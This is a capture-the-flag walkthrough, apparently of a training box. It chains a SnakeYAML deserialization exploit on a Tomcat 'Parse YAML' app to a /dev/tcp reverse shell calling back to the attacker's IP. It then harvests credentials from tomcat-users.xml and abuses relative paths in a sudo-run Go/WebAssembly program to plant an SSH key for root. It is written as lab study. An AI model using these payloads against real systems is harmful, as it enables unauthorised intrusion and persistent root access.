<h2 id="the-big-picture">The Big Picture</h2>
<p>The test begins with unauthenticated network access and follows only evidence exposed by the target.</p>
<p>The attack chain on this box:</p>
<ol>
<li>Discover open ports</li>
<li>Find a vulnerable YAML parser running on Tomcat</li>
<li>Exploit Java deserialization to get a shell</li>
<li>Find credentials left in a config file</li>
<li>SSH in as a real user and grab the user flag</li>
<li>Abuse a sudo misconfiguration involving WebAssembly to become root</li>
</ol>
<hr>
<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
<h3 id="step-1-port-scan-with-nmap">Step 1: Port Scan with Nmap</h3>
<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p 22,8080 10.129.11.226
</code></pre>
<p><strong>What this does:</strong></p>
<ul>
<li><code>-sC</code> runs default scripts (banner grabbing, version detection helpers)</li>
<li><code>-sV</code> probes open ports to determine the service and version</li>
<li><code>-p 22,8080</code> limits the scan to the two most common ports for this type of box (SSH and HTTP-alt)</li>
</ul>
<p><strong>Results:</strong></p>
<pre><code>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
8080/tcp open  http    Apache Tomcat 9.0.38
                       Title: Parse YAML
</code></pre>
<p><strong>Reason:</strong><br>You cannot attack what you cannot see. Port scanning is always the first step - it gives you the map of the attack surface. Two ports means two potential entry points.</p>
<p><br>See port 8080 with "Apache Tomcat" and think: <em>Java web application</em>. Tomcat runs Java servlets and JSPs. Java apps are historically prone to deserialization vulnerabilities. The title "Parse YAML" is an immediate warning sign - parsing user-supplied data is exactly where deserialization bugs live.</p>
<hr>
<h2 id="phase-2-web-enumeration">Phase 2: Web Enumeration</h2>
<h3 id="step-2-inspect-the-web-application">Step 2: Inspect the Web Application</h3>
<p>Visit <code>http://10.129.11.226:8080</code> in a browser or with curl to understand what the app does.</p>
<pre><code class="language-bash" data-language="bash">curl -s http://10.129.11.226:8080/ | grep -i 'form\|action\|method'
</code></pre>
<p><strong>What you find:</strong><br>A single-page YAML parser with a textarea form. The form POSTs to <code>/Servlet</code>. Submitting any text returns:</p>
<blockquote>
<p>"Due to security reason this feature has been temporarily on hold."</p>
</blockquote>
<p><br>That message says the <em>feature</em> is on hold, not that the code is disabled. The error is shown <em>after</em> the input is processed - which means the deserialization may still happen before the security check fires. The app is lying about being shut down.</p>
<p><strong>Why enumerate the form action:</strong><br>Do not assume the POST endpoint. read the HTML source to find the exact URL (<code>/Servlet</code> in this case). Sending a payload to the wrong endpoint wastes time and gives false negatives.</p>
<hr>
<h2 id="phase-3-exploitation-snakeyaml-deserialization">Phase 3: Exploitation (SnakeYAML Deserialization)</h2>
<h3 id="step-3-confirm-deserialization-vulnerability">Step 3: Confirm Deserialization Vulnerability</h3>
<p>Start a Python HTTP server on port 80:</p>
<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
</code></pre>
<p>Send a test YAML payload that instructs the server to load a class from your machine:</p>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.11.226:8080/Servlet \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'data=!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.16.84/"]
  ]]
]'
</code></pre>
<p><strong>Watch your HTTP server.</strong> If you see:</p>
<pre><code>GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1
</code></pre>
<p>...the vulnerability is confirmed.</p>
<p><strong>What is happening here:</strong><br>SnakeYAML is a Java library that converts YAML text into Java objects. The <code>!!</code> syntax tells SnakeYAML to instantiate a specific Java class. By specifying <code>URLClassLoader</code> and pointing it at our machine, we force the server to reach out and try to load a Java class from us. This is unauthenticated Remote Code Execution by design flaw.</p>
<p><br>Prove a vulnerability before trying to exploit it. The canary (HTTP callback) costs nothing and proves the code path is live. If no callback arrives, the feature really is disabled and you move on rather than wasting hours building an exploit that can't fire.</p>
<p><strong>Why <code>ScriptEngineManager</code>?</strong><br>This is the standard SnakeYAML gadget chain. <code>ScriptEngineManager</code> accepts a <code>URLClassLoader</code> argument in its constructor, and Java's service loader mechanism then automatically tries to fetch and instantiate any class listed in the <code>META-INF/services/javax.script.ScriptEngineFactory</code> file inside the JAR.</p>
<hr>
<h3 id="step-4-build-the-exploit-jar">Step 4: Build the Exploit JAR</h3>
<p>Clone the ready-made payload template:</p>
<pre><code class="language-bash" data-language="bash">git clone https://github.com/artsploit/yaml-payload
cd yaml-payload
</code></pre>
<p><strong>Why a JAR and not a raw class file?</strong><br>Java's <code>URLClassLoader</code> + service loader combination requires the class to be packaged inside a JAR with the correct <code>META-INF/services/</code> directory structure. A raw <code>.class</code> file won't trigger automatic instantiation.</p>
<p>Edit <code>src/artsploit/AwesomeScriptEngineFactory.java</code>. The constructor runs when the class is instantiated - which happens automatically when the JAR is loaded. Put your payload there:</p>
<pre><code class="language-java" data-language="java">public AwesomeScriptEngineFactory() throws InterruptedException {
    try {
        Process p = Runtime.getRuntime().exec("curl http://10.10.16.84/shell.sh -o /dev/shm/.s.sh");
        p.waitFor();
        p = Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh");
        p.waitFor();
        p = Runtime.getRuntime().exec("/dev/shm/.s.sh");
    } catch (IOException e) {
        e.printStackTrace();
    }
}
</code></pre>
<p><strong>Why a two-stage approach (download then execute)?</strong><br><code>Runtime.getRuntime().exec()</code> does not use a shell - it cannot handle pipes (<code>|</code>), redirects (<code>&gt;</code>), or compound commands (<code>;</code>). A direct bash reverse shell string like <code>bash -i &gt;&amp; /dev/tcp/...</code> will silently fail because <code>exec()</code> passes it to the OS as a single binary name with arguments, not to a shell interpreter.</p>
<p>The workaround: use <code>exec()</code> to call <code>curl</code> (which has no special characters), download a shell script to a writable location (<code>/dev/shm</code> is almost always writable), then call <code>bash</code> on the script.</p>
<p><strong>Why <code>/dev/shm</code>?</strong><br>It is a tmpfs in RAM. It is world-writable by default on Linux, leaves no disk traces, and is always available regardless of what other directories are mounted or restricted.</p>
<p>Create the reverse shell script:</p>
<pre><code class="language-bash" data-language="bash">cat &gt; /tmp/shell.sh &lt;&lt; 'EOF'
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1
EOF
</code></pre>
<p>Compile and package:</p>
<pre><code class="language-bash" data-language="bash">javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf rev.jar -C src/ .
</code></pre>
<hr>
<h3 id="step-5-deliver-the-payload-and-catch-the-shell">Step 5: Deliver the Payload and Catch the Shell</h3>
<p><strong>Terminal 1</strong> - Serve both files from the yaml-payload directory:</p>
<pre><code class="language-bash" data-language="bash">cp /tmp/shell.sh .
sudo python3 -m http.server 80
</code></pre>
<p><strong>Terminal 2</strong> - Listen for the reverse shell connection:</p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p><strong>Terminal 3</strong> - Trigger the exploit:</p>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.11.226:8080/Servlet \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'data=!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.16.84/rev.jar"]
  ]]
]'
</code></pre>
<p><strong>You now have a shell as <code>tomcat</code>:</strong></p>
<pre><code>uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
</code></pre>
<p><strong>Upgrade the shell to a proper TTY:</strong></p>
<pre><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter, then type:
reset
# Terminal type: xterm
</code></pre>
<p><strong>Why upgrade the shell?</strong><br>A raw netcat shell has no job control, no arrow keys, and Ctrl+C kills your listener rather than the remote process. A proper PTY behaves like a real terminal - essential for interactive tools like <code>sudo</code>, <code>ssh</code>, and <code>su</code>.</p>
<hr>
<h2 id="phase-4-lateral-movement-tomcat-admin">Phase 4: Lateral Movement (tomcat → admin)</h2>
<h3 id="step-6-search-for-credentials">Step 6: Search for Credentials</h3>
<pre><code class="language-bash" data-language="bash">cat /opt/tomcat/conf/tomcat-users.xml
</code></pre>
<p><strong>What you find:</strong></p>
<pre><code class="language-xml" data-language="xml">&lt;user username="admin" password="REDACTED" roles="manager-gui,admin-gui"/&gt;
</code></pre>
<p><strong>Why look here?</strong><br>Tomcat stores its management credentials in <code>tomcat-users.xml</code>. This is well-known to anyone who has managed Tomcat servers. As a pentester, whenever you land on a Tomcat service account, this is the first file you check.</p>
<p><br>Developers configure services with credentials and then forget about them. Configuration files are useful sources - they contain passwords for databases, admin panels, and often other systems. The credential <code>whythereisalimit</code> is also likely reused by the human admin account on the OS itself (password reuse is endemic).</p>
<hr>
<h3 id="step-7-ssh-as-admin-and-grab-user-flag">Step 7: SSH as Admin and Grab User Flag</h3>
<p>From Kali:</p>
<pre><code class="language-bash" data-language="bash">ssh admin@10.129.11.226
# Password: REDACTED
</code></pre>
<pre><code class="language-bash" data-language="bash">cat ~/user.txt
# 2a74f81[redacted]319a436ab
</code></pre>
<p><strong>Why SSH instead of <code>su admin</code> in the tomcat shell?</strong><br>SSH gives you a clean, stable, fully interactive session. The reverse shell can die if the web request times out. SSH is persistent and reliable for the rest of the engagement.</p>
<hr>
<h2 id="phase-5-privilege-escalation-admin-root">Phase 5: Privilege Escalation (admin → root)</h2>
<h3 id="step-8-enumerate-sudo-rights">Step 8: Enumerate Sudo Rights</h3>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</code></pre>
<p><strong>What this means:</strong><br>The <code>admin</code> user can run one specific Go program as root, without a password. This is a common sysadmin pattern - "give this user just enough to do their job." But the implementation is flawed.</p>
<p><br><code>sudo -l</code> is always your first stop after getting a user shell. Any entry here is a potential escalation path. The interesting detail is that Go is being used to run a <em>specific file</em>, but that file's behavior depends on other files in the current directory.</p>
<hr>
<h3 id="step-9-analyze-index-go">Step 9: Analyze index.go</h3>
<pre><code class="language-bash" data-language="bash">cat /opt/wasm-functions/index.go
</code></pre>
<p><strong>Key logic:</strong></p>
<pre><code class="language-go" data-language="go">bytes, _ := wasm.ReadBytes("main.wasm")       // relative path!
instance, _ := wasm.NewInstance(bytes)
init := instance.Exports["info"]
result, _ := init()
f := result.String()
if (f != "1") {
    fmt.Println("Not ready to deploy")
} else {
    fmt.Println("Ready to deploy")
    out, err := exec.Command("/bin/sh", "deploy.sh").Output()  // relative path!
</code></pre>
<p><strong>The vulnerability:</strong><br><code>main.wasm</code> and <code>deploy.sh</code> are referenced with <strong>relative paths</strong> - no <code>/opt/wasm-functions/</code> prefix. Go (and most runtimes) resolve relative paths from the <strong>current working directory</strong> when the process starts.</p>
<p>Since <code>sudo</code> does not change the working directory by default, if you <code>cd</code> into a directory you control and run <code>sudo /usr/bin/go run /opt/wasm-functions/index.go</code>, the program will read <code>main.wasm</code> and <code>deploy.sh</code> from <em>your</em> directory, not from <code>/opt/wasm-functions/</code>.</p>
<p><br>Relative paths in privileged programs are a classic privesc primitive. The developer assumed the program would always run from <code>/opt/wasm-functions/</code>, but <code>sudo</code> doesn't enforce that. ask: "what does this program depend on, and can I influence those dependencies?"</p>
<hr>
<h3 id="step-10-copy-files-to-a-writable-directory">Step 10: Copy Files to a Writable Directory</h3>
<pre><code class="language-bash" data-language="bash">cp -r /opt/wasm-functions/* /dev/shm/
</code></pre>
<p>We now have our own copies of all files, including <code>main.wasm</code> and <code>deploy.sh</code>, in a directory we fully control.</p>
<hr>
<h3 id="step-11-understand-and-patch-main-wasm">Step 11: Understand and Patch main.wasm</h3>
<p><strong>Transfer to Kali:</strong></p>
<pre><code class="language-bash" data-language="bash"># On Kali:
sshpass -p REDACTED scp admin@10.129.11.226:/dev/shm/main.wasm /tmp/main.wasm
</code></pre>
<p><strong>Decompile to human-readable WebAssembly Text format:</strong></p>
<pre><code class="language-bash" data-language="bash">wasm2wat /tmp/main.wasm -o /tmp/main.wat
cat /tmp/main.wat
</code></pre>
<p><strong>What you see:</strong></p>
<pre><code class="language-wat" data-language="wat">(func $info (type 0) (result i32)
  i32.const 0)
</code></pre>
<p>The <code>info</code> function unconditionally returns <code>0</code>. The Go program checks <code>if (f != "1")</code> - so <code>0</code> prints "Not ready to deploy" and never runs <code>deploy.sh</code>.</p>
<p><strong>Patch it:</strong></p>
<pre><code class="language-bash" data-language="bash">sed -i 's/i32.const 0/i32.const 1/' /tmp/main.wat
</code></pre>
<p><strong>Recompile to binary:</strong></p>
<pre><code class="language-bash" data-language="bash">wat2wasm /tmp/main.wat -o /tmp/main.wasm
</code></pre>
<p><strong>Upload back:</strong></p>
<pre><code class="language-bash" data-language="bash">sshpass -p REDACTED scp /tmp/main.wasm admin@10.129.11.226:/dev/shm/main.wasm
</code></pre>
<p><strong>Why WebAssembly?</strong><br>WASM is a binary format designed for portability and sandboxed execution. The <code>wabt</code> toolkit (<code>wasm2wat</code> / <code>wat2wasm</code>) lets you round-trip between binary and text format just like a disassembler/assembler. Understanding what the WASM does only requires reading a few lines of the text format.</p>
<p><br>When a program checks the output of another binary, ask: "can I replace or modify that binary?" Here we can - because we copied it to our own directory. The gate (<code>f != "1"</code>) is just a number check, and we control the code that produces that number.</p>
<hr>
<h3 id="step-12-write-the-malicious-deploy-sh">Step 12: Write the Malicious deploy.sh</h3>
<p>Generate an SSH keypair on Kali:</p>
<pre><code class="language-bash" data-language="bash">ssh-keygen -t ed25519 -f /tmp/root_key -N ""
cat /tmp/root_key.pub
</code></pre>
<p>On the target (in the admin SSH session):</p>
<pre><code class="language-bash" data-language="bash">cat &gt; /dev/shm/deploy.sh &lt;&lt; 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-ed25519 REDACTED_ENCODED_LAB_MATERIAL kali@kali" &gt;&gt; /root/.ssh/authorized_keys
EOF
chmod +x /dev/shm/deploy.sh
</code></pre>
<p><strong>Why SSH key injection instead of a reverse shell?</strong><br>A reverse shell is fragile - one network hiccup and it dies. Writing your public key to root's <code>authorized_keys</code> is <strong>persistent</strong>. Even if you lose the connection, you can SSH back in as root at any time. It is also completely silent - no new processes, no outbound connections triggered by the escalation itself.</p>
<p><strong>Why <code>mkdir -p /root/.ssh</code>?</strong><br>If <code>/root/.ssh</code> does not exist, the <code>echo &gt;&gt;</code> would fail silently. The <code>-p</code> flag creates the directory (and any parents) only if needed, and does not error if it already exists.</p>
<hr>
<h3 id="step-13-trigger-the-exploit">Step 13: Trigger the Exploit</h3>
<pre><code class="language-bash" data-language="bash">cd /dev/shm
sudo /usr/bin/go run /opt/wasm-functions/index.go
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>Ready to deploy
</code></pre>
<p>What just happened, step by step:</p>
<ol>
<li><code>sudo</code> ran <code>index.go</code> as root, with CWD = <code>/dev/shm</code></li>
<li><code>index.go</code> read <code>main.wasm</code> from <code>/dev/shm</code> (our patched version)</li>
<li>The <code>info</code> function returned <code>1</code> instead of <code>0</code></li>
<li>The if-check passed</li>
<li><code>/bin/sh deploy.sh</code> ran - from <code>/dev/shm</code> : as <strong>root</strong></li>
<li>Our deploy.sh appended our public key to <code>/root/.ssh/authorized_keys</code></li>
</ol>
<hr>
<h3 id="step-14-ssh-in-as-root-and-grab-the-flag">Step 14: SSH in as Root and Grab the Flag</h3>
<pre><code class="language-bash" data-language="bash">ssh -i /tmp/root_key root@10.129.11.226
cat /root/root.txt
# 2029f2d[redacted]52012043ca
</code></pre>
<p><strong>Machine fully compromised.</strong></p>
